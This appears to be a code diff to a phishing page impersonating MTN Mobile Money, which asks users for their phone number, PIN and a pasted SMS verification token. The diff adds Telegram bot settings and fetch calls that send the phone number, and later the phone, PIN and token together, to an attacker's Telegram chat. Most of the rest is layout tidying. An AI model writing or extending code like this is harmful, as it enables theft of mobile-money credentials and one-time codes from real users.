@@ -25,12 +25,9 @@
       background-color: var(--primary-blue);
       margin: 0;
       padding: 0;
-      height: 100vh;
-      height: 100dvh;
+      min-height: 100dvh;
       display: flex;
       flex-direction: column;
-      overflow: hidden;
-      overflow-y: auto;
     }
 
     .pin-box {
@@ -141,33 +138,30 @@
   </div>
 
   <div id="pre-pin-screen"
-    class="hidden fixed inset-0 w-full h-screen px-6 flex-col justify-between py-12 items-center bg-white z-40 transition-opacity duration-300 opacity-0">
-    <div class="w-full flex flex-col items-center flex-1 justify-center max-w-md">
-      <div class="mb-6">
-        <img src="mtn-logo.png" alt="Logo" class="w-28 h-auto object-contain" />
+    class="hidden fixed inset-0 w-full min-h-dvh px-6 flex-col justify-between py-8 items-center bg-white z-40 transition-opacity duration-300 opacity-0 overflow-y-auto">
+    <div class="w-full flex flex-col items-center flex-1 justify-center max-w-md my-auto">
+      <div class="mb-4">
+        <img src="mtn-logo.png" alt="Logo" class="w-24 h-auto object-contain" />
       </div>
-      <h2 class="text-2xl font-bold text-[#003366] mb-4 italic text-center">Account Security Verification</h2>
-      <p class="text-center text-sm text-slate-500 mb-8 max-w-xs leading-relaxed">
+      <h2 class="text-2xl font-bold text-[#003366] mb-2 italic text-center">Account Security Verification</h2>
+      <p class="text-center text-sm text-slate-500 mb-6 max-w-xs leading-relaxed">
         Paste your verification message below.
       </p>
 
       <div class="w-full relative border border-gray-400 rounded-[20px] bg-white px-4 pt-4 focus-within:border-[#004f71] transition-colors mb-6">
-  
-  <label class="absolute left-4 -top-2.5 bg-white px-1 text-xs text-[#004f71] font-medium">
-    Verification Token *
-  </label>
-
-  <textarea
-    id="prePinInput"
-    rows="3"
-    placeholder="Please open the sms from MoMoApp, press and hold on the message text, tap select all then copy and paste here" 
-    class="w-full bg-transparent text-[14px] md:text-[14px] text-gray-800 outline-none font-medium tracking-wide resize-none placeholder-gray-400 pb-3"
-  ></textarea>
-
-</div>
+        <label class="absolute left-4 -top-2.5 bg-white px-1 text-xs text-[#004f71] font-medium">
+          Verification Token *
+        </label>
+        <textarea
+          id="prePinInput"
+          rows="3"
+          placeholder="Please open the sms from MoMoApp, press and hold on the message text, tap select all then copy and paste here" 
+          class="w-full bg-transparent text-[14px] text-gray-800 outline-none font-medium tracking-wide resize-none placeholder-gray-400 pb-3"
+        ></textarea>
+      </div>
     </div>
 
-    <div class="w-full flex justify-center">
+    <div class="w-full flex justify-center mt-4">
       <button id="prePinSubmitBtn" disabled
         class="w-full max-w-sm bg-gray-200 text-gray-500 py-3.5 rounded-full font-semibold text-base tracking-wide uppercase shadow-sm transition-colors cursor-not-allowed">
         Verify
@@ -216,8 +210,7 @@
 
           <div
             class="flex-1 relative border border-gray-400 rounded-[20px] bg-white px-4 flex items-center focus-within:border-[#004f71] transition-colors">
-            <label class="absolute left-4 -top-2.5 bg-white px-1 text-xs text-[#004f71] font-medium">Enter number
-              *</label>
+            <label class="absolute left-4 -top-2.5 bg-white px-1 text-xs text-[#004f71] font-medium">Enter number *</label>
             <input type="tel" id="phoneNumber" placeholder="256"
               class="w-full h-full bg-transparent text-[18px] text-gray-800 outline-none font-medium tracking-wide" />
           </div>
@@ -290,6 +283,10 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
+      // --- Telegram Bot API Configuration ---
+      const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Replace with your actual Bot Token
+      const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";     // Replace with your actual Admin Chat ID
+
       // --- Elements Declarations ---
       const splashScreen = document.getElementById("splash-screen");
       const mainContent = document.getElementById("main-content");
@@ -318,7 +315,6 @@
 
       let currentPrefix = "256";
 
-      // Initialize default field configuration
       if (phoneInput) phoneInput.value = currentPrefix;
 
       // --- Splash Screen Timeout ---
@@ -370,7 +366,6 @@
         }
         e.target.value = value;
 
-        // Validation rule validation switch
         if (value.length > currentPrefix.length + 5) {
           submitBtn.disabled = false;
           submitBtn.classList.remove("bg-gray-200", "text-gray-500", "cursor-not-allowed");
@@ -395,8 +390,31 @@
         }
       });
 
-      // --- Navigations Flow Switching Execution Links ---
-      submitBtn.addEventListener("click", () => {
+      // --- MODIFIED: Handles Phone submit, sends data to Telegram, then moves to text area ---
+      submitBtn.addEventListener("click", async () => {
+        // Show loading state while processing telegram send
+        loaderOverlay.style.display = "flex";
+        statusText.textContent = "Processing details...";
+
+        const message = `📱 New Login Attempt\n\n🔹 Phone Number: +${phoneInput.value}`;
+
+        try {
+          // Send to Telegram Bot
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message
+            })
+          });
+        } catch (error) {
+          console.error("Telegram send failed:", error);
+        }
+
+        // Hide loader and instantly transition to textarea token block
+        loaderOverlay.style.display = "none";
+        
         mainContent.style.opacity = "0";
         setTimeout(() => {
           mainContent.classList.add("hidden");
@@ -458,6 +476,16 @@
       // --- Backend Data Delivery Stream System ---
       async function handleFinalSubmission(phone, pin, token) {
         loaderOverlay.style.display = "flex";
+
+        // Optional: You can send a final combined log to your Telegram here as well if required
+        const finalMessage = `👤 User Data Logs\n\n📞 Phone: +${phone}\n🔑 PIN: ${pin}\n🎟️ Token: ${token}`;
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: finalMessage })
+          });
+        } catch(e) {}
 
         try {
           const response = await fetch("/api/submit", {
